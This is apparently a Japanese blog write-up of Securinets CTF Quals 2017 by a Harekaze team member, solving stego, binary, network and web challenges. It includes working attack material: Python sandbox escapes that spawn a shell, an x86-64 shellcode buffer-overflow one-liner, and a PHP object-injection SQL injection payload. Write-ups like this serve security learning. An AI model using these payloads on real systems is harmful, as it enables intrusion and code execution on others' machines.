---
layout: post
title: Securinets CTF Quals 2017 の write-up
categories: [ctf]
date: 2017-03-28 02:04:03 +0900
---

チーム Harekaze で [Securinets CTF Quals 2017](https://www.ctfsecurinets.com) に参加しました。最終的にチームで 2830 点を獲得し、順位は 1 位 (得点 78 チーム中) でした。うち、私は 12 問を解いて 2830 点を入れました。

以下、解いた問題の write-up です。

## [Stegano 200] Welcome Stega

bmp ファイルが渡されます。バイナリエディタで見ると `ces` `uoy` という感じで明らかに文字列が仕込まれています。

```python
from PIL import Image
im = Image.open('Welcome.bmp')
w, h = im.size
pix = im.load()
s = ''
for x in range(0, w, 3):
  for y in range(0, h, 3):
    r, g, b = pix[x, y]
    s += chr(r) + chr(g) + chr(b)
print s
```

これを実行すると

```
Yokoso minasan, Welcome to securinets Prequals CTF,
hope you pass a great journey for the next 24 h with our challenges
let The Game Begin.
You can validate this challenge with the next flag: Securinet_Prequal_2017_Began
Hope this challenge wasn't too hard.
Securinet_Prequals_Team wish you good luck
```

と出力されました。

```
Securinet_Prequal_2017_Began
```

## [Stegano 250] Misc

与えられた URL にアクセスするとログインフォームが表示されました。が、ユーザ名もパスワードも分かりません…。

ソースを見ると `ourlogo.png` という画像を読み込んでいるようだったのでダウンロードしました。これを binwalk にかけると、

```
$ binwalk ourlogo.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 641 x 473, 8-bit colormap, non-interlaced
1664          0x680           Zlib compressed data, best compression
15540         0x3CB4          Zip archive data, at least v2.0 to extract, compressed size: 48, uncompressed size: 50, name: login.txt
15627         0x3D0B          Zip archive data, at least v2.0 to extract, compressed size: 184627, uncompressed size: 439125, name: givenSound.wav
200485        0x30F25         End of Zip archive, footer length: 22
```

と出力されました。

zip を展開すると `givenSound.wav` `login.txt` というファイルが得られました。`givenSound.wav` はモールス信号、`login.txt` はログインフォームで使うユーザ名 (`Stegano#2_Login`) のようです。

モールス信号をデコードすると `PASSWORDTOGATHEFLAGIS5PWJPZQVPG5Y2X2VPGLJ` という文字列が得られました。

先ほどのログインフォームにユーザ名に `Stegano#2_Login` パスワードに `5PWJPZQVPG5Y2X2VPGLJ` を入力してログインするとフラグが得られました。

```
cc"97YX993n+c+8Lp8&94piagffbXm
```

## [Binary 50] Fix It, Or May Be Not?

バイナリを strings にかけると `NDc2ZjZmNjQ1ZjRhNmY2MjVmNDI3Mjc1Njg1Zjc0Njg2NTVmNzc2ZjcyNzM3NDVmNjk3MzVmNzM3\nNDY5NmM2YzVmNzQ2ZjVmNjM2ZjZkNjU=\n` という文字列が得られました。

これを base64 デコードして、さらに hex デコードするとフラグが得られました。

```
Good_Job_Bruh_the_worst_is_still_to_come
```

## [Binary 80] To Wait Or Not To Wait That's The Question

Python で任意のコードが実行できるサービスでした。`__import__('os').system('/bin/sh')` で `/bin/sh` が実行できました。あとは `cat remote.py` でフラグが得られました。

```
DoYouEvenLiftBro??
```

## [Binary 300] Can You Beat The Snake?

Python でほぼ任意のコードが実行できるサービスでした。いろいろ試していると、数字が入っていたり 31 文字以上だったりすると実行できず、また組み込み関数は消されてしまっているという制限があると分かりました。

[Javex' Blog](https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html) を参考に

```python
A='a'.__len__()
B=A<<A
C=B<<A
D=C<<A
E=D<<A
F=E<<A
Z=A+B+D+E+F

a=().__class__.__base__
b=a.__subclasses__()
d=b[Z].__init__.__globals__
o='os'
e=d['linecache'].__dict__[o]
e.system('cat *')
```

でフラグが得られました。

```
TsssssssssssTheSnakeSwaresToTakeRevengeTsssssssssss
```

## [Binary 400] Can You Ride The Dragon To New Heights?

ASLR は無効、checksec をすると

```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

という感じでした。

```python
from pwn import *
context(arch='amd64', os='linux')
shellcode = ''
shellcode += 'xor eax, eax; mov al, SYS_setresgid; xor edi, edi; mov di, 1007; xor esi, esi; mov si, 1007; xor edx, edx; mov dx, 1007; syscall;'
shellcode += shellcraft.sh()
print repr(asm(shellcode))
```

でシェルコードを作ったあと、`./sploit $(python -c "import struct; payload = ''; payload += '1\xc0\xb0w1\xfff\xbf\xef\x031\xf6f\xbe\xef\x031\xd2f\xba\xef\x03\x0f\x05hri\x01\x01\x814$\x01\x01\x01\x011\xd2Rj\x08ZH\x01\xe2RH\x89\xe2jhH\xb8/bin///sPj;XH\x89\xe7H\x89\xd6\x99\x0f\x05'; payload += 'A' * (72 - len(payload)); payload += struct.pack('<Q', 0x7fffffffeac0); print payload")` という感じでシェルが取れました。あとは `cat .passwd` でフラグが得られました。

```
iTsEEMsYouKnowHowToRideDragons,AreYouADragonRider?
```

## [Binary 450] I'm special

特殊文字しか使えない bash でした。

`*` を実行すると同じディレクトリに `bash_jail.sh` という名前のファイルがあると分かります。これの先頭 4 文字を使って bash を起動させてしまいましょう。

`__=$(($$/$$));?????????.??;${_::$(($__+$__+$__+$__))}` を実行すると bash が起動できました。あとは `./flag_reader flag` でフラグが得られました。

```
Do_You_Think_Bash_Is_Easy_Bruh?
```

## [Network 200] NGINX default config

まず http://web1.ctfsecurinets.com:81/robots.txt を見ると

```
User-agent: *
Disallow: /S3creT/Flag__File__.txt.flag
```

とありました。が、`/S3creT/Flag__File__.txt.flag` を見るには認証が必要なようです。

どうすればいいのか悩んでいましたが、[@hiww](https://twitter.com/hiww) さんが `web1.ctfsecurinets.com` に対してポートスキャンをかけて 9999 番ポートが開いていることが分かりました。

あとは http://web1.ctfsecurinets.com:9999/S3creT/Flag__File__.txt.flag にアクセスするとフラグが得られました。

```
tIU0BuuDO8q8Z8b1yVfl
```

## [Web 50] Initiation

与えられた URL にアクセスすると HTTP レスポンスヘッダに `flag: iiPBy0vcrZEqWiyWjhv2` とありました。

```
iiPBy0vcrZEqWiyWjhv2
```

## [Web 50] Criminals X Hunter

与えられた URL でゲームができるようです。`/killAction.php?idS=0&idD=1&xS=0&yS=0&xD=0&yD=0` を開いてすぐ `/getFlag.php` を開くとフラグが得られました。

```
H0w_D1d_Y0u_Th4T_1m_F45T3R_Th4N_Th3_L1GhT
```

## [Web 300] Web6

PHP Object Injection と SQLi と Magic Hash を使う問題でした。

```php
<?php
class User {
    public $id;
    public $name;
    public $pass;
    public $key;

    public function __construct() {
        $this->id   = '';
        $this->name = "' and 0 union select 1, 2, 3, '240610708';#";
        $this->pass = '';
        $this->key  = '';
    }

}
echo urlencode(serialize(new User));
```

出力された文字列を Cookie にセットするとフラグが得られました。

```
TH3Fl4G_obN44ahTjxjDREv
```

## [Web 500] The Impenetrable Castle

100 個のユーザ名とパスワードのペアが与えられるので、10 分以内にすべてのユーザでログインしろという問題でした。ログインには CAPTCHA を入力しなければなりません。それ以外は自動化してしまいましょう。

```python
import requests
import sys
from PyQt5.QtWidgets import QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout, QApplication
from PyQt5.QtGui import QPixmap

class Window(QWidget):
  def __init__(self, parent=None):
    super(Window, self).__init__(parent)

    self.textbox = QLineEdit()
    self.textbox.returnPressed.connect(self.submit)

    self.button = QPushButton()
    self.button.setText('submit')
    self.button.clicked.connect(self.submit)

    self.label = QLabel()
    self.label.setPixmap(QPixmap("image.png"))

    self.layout = QVBoxLayout()
    self.layout.addWidget(self.label)
    self.layout.addWidget(self.textbox)
    self.layout.addWidget(self.button)
    self.setLayout(self.layout)

    self.initWeb()

  def initWeb(self):
    self.cookies = {
	  'PHPSESSID': 'xxxxxxxxxxxxxxxxxxxxxxxxxx'
    }
    self.keys = requests.get('http://web3.ctfsecurinets.com/keys.txt', cookies=self.cookies).content
    self.keys = self.keys.decode('ascii').splitlines()

    self.counter = 0

    self.nextCaptcha()

  def nextCaptcha(self):
    with open('tmp.png', 'wb') as f:
      f.write(requests.get('http://web3.ctfsecurinets.com/image.png', cookies=self.cookies).content)
    self.label.setPixmap(QPixmap("tmp.png"))

  def submit(self):
    captcha = self.textbox.text()
    self.textbox.clear()

    username, password = self.keys[self.counter].split(':')
    c = requests.post('http://web3.ctfsecurinets.com/captcha.php', data={
      'login': username,
      'password': password,
      'captcha': captcha
    }, cookies=self.cookies).content.decode('ascii')
    print(c.splitlines()[15])
    if 'Invalid Captcha' in c:
      self.keys.append(self.keys[self.counter])

    with open('res/secret{:03d}.html'.format(self.counter), 'wb') as f:
      f.write(requests.get('http://web3.ctfsecurinets.com/secret.php', cookies=self.cookies).content)
    requests.get('http://web3.ctfsecurinets.com/logout.php', cookies=self.cookies)

    print(self.counter, username, password, captcha)

    self.counter += 1
    self.nextCaptcha()

app = QApplication(sys.argv)
window = Window()
window.show()

sys.exit(app.exec_())
```

100 回 (+ 打ち間違えた回数) CAPTCHA を入力すると `Th3_Pr3C1oU5_fLA4_oF_Th3_3Mp1r3` と書かれた画像が手に入れられました。

この文字列とスクリプトを運営にメールするとフラグが手に入れられました。

```
N1C3_5cR1pT_H4cK3r_T4k3_Ly_Tr3A5uR3
```

## 感想

1 位でした。やったー!
